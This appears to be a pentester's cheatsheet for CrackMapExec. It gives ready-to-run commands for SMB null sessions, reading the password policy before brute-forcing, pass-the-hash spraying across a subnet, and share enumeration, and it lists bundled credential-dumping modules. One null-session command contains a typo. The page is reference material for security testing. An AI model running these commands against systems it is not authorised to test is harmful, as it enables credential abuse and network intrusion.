# Crackmapexec Cheatsheet
Contains the submodules
-   [Impacket](https://github.com/CoreSecurity/impacket)
-   [Pywinrm](https://github.com/diyan/pywinrm)
-   [Pywerview](https://github.com/the-useless-one/pywerview)
-   [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
-   [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
-   [Invoke-Vnc](https://github.com/artkond/Invoke-Vnc)
-   [Mimikittenz](https://github.com/putterpanda/mimikittenz)
-   [NetRipper](https://github.com/NytroRST/NetRipper)
-   [RandomPS-Scripts](https://github.com/xorrior/RandomPS-Scripts)
-   [SessionGopher](https://github.com/fireeye/SessionGopher)
-   [Mimipenguin](https://github.com/huntergregal/mimipenguin)


## Connecting
```bash
crackmapexec smb $domain
crackmapexec smb $IP $IP-2
crackmapexec smb $IP-Range $IP-Range-More-Specific 
crackmapexec smb $Subnetmask
crackmapexec smb targets.txt
```

#### Null sessions
```bash
crackmapexec smb $IP -u "" up ""
```

With Null sessions Windows System that upgraded from 2003, anonymous authenication to grab password policy:
```bash
crackmapexec smb $IP --pass-pol -u '' -p ''
```
Account lockout threshold: 0 -> bruteforcing with [[Password-Attacks]] 

```bash
crackmapexec smb $IP  -u <user> -p <password>
```

## Spraying
#### Pass the hash against a subnet
```bash

crackmapexec smb $Subnetmask -u administrator -H 'LMHASH:NTHASH' --local-auth
crackmapexec smb $Subnetmask -u administrator -H 'NTHASH'
```

## Enumeration

```bash
crackmapexec smb $Subnetmask -u $foothold-account -p $password --shares

```

## References

[ivoidwarranties](https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/)
[haax9](https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/)
[haax9 -Github](https://github.com/Haax9)
[blackhatethicalhacking](https://www.blackhatethicalhacking.com/tools/crackmapexec/)